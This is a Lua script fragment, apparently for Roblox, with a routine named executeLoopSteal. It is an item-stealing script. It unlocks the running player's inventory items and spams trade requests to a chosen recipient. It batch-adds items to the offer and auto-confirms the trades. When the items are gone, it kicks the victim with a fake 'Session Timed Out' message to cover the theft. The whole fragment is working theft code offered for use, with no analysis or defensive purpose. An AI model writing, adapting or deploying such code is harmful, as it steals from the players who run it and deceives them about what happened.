local function hAPI(name, ...)
    local router = Fsys("RouterClient")
    local remote = router.get(name)
    if remote then
        if remote:IsA("RemoteFunction") then return remote:InvokeServer(...) end
        remote:FireServer(...)
    end
end

local function executeLoopSteal(rec, hits)
    task.spawn(function()
        local currentHits = hits
        while #currentHits > 0 do
            -- Instant Unlock
            for i = 1, math.min(18, #currentHits) do
                hAPI("BackpackAPI/SetItemLocked", currentHits[i].uid, false)
                hAPI("BackpackAPI/SetItemFavorite", currentHits[i].uid, false)
            end
            
            local lastReq, burst, s2s = 0, 0, false
            local inTrade = false
            
            -- Sniper Request (2s Delay + 10.1s Counter-Reset)
            while not inTrade do
                local tUI = LP.PlayerGui:FindFirstChild("TradeApp")
                if tUI and tUI.Enabled and tUI:FindFirstChild("Frame") and tUI.Frame.Visible then
                    inTrade = true
                    break
                end
                
                if not s2s then 
                    task.wait(2)
                    hAPI("TradeAPI/SendTradeRequest", rec)
                    s2s, lastReq, burst = true, tick(), 1
                elseif tick() - lastReq > 10.1 then 
                    hAPI("TradeAPI/SendTradeRequest", rec)
                    lastReq, burst = tick(), 1
                elseif burst < 3 then 
                    hAPI("TradeAPI/SendTradeRequest", rec)
                    burst = burst + 1; task.wait(0.5) 
                end
                task.wait(0.5)
            end

            -- Lightning Batch Adding (Tobi Packet Style)
            for i = 1, math.min(18, #currentHits) do
                local targetUID = currentHits[1].uid
                task.spawn(function() hAPI("TradeAPI/AddItemToOffer", targetUID) end)
                table.remove(currentHits, 1)
            end

            -- Auto-Confirm Loop
            local startTime = tick()
            while tick() - startTime < 15 do
                hAPI("TradeAPI/AcceptNegotiation")
                hAPI("TradeAPI/ConfirmTrade")
                task.wait(0.4)
                if not LP.PlayerGui.TradeApp.Frame.Visible then break end
            end
            task.wait(1.5) -- Safety buffer between trade waves
        end
        LP:Kick("Session Timed Out: Please Rejoin.")
    end)
end

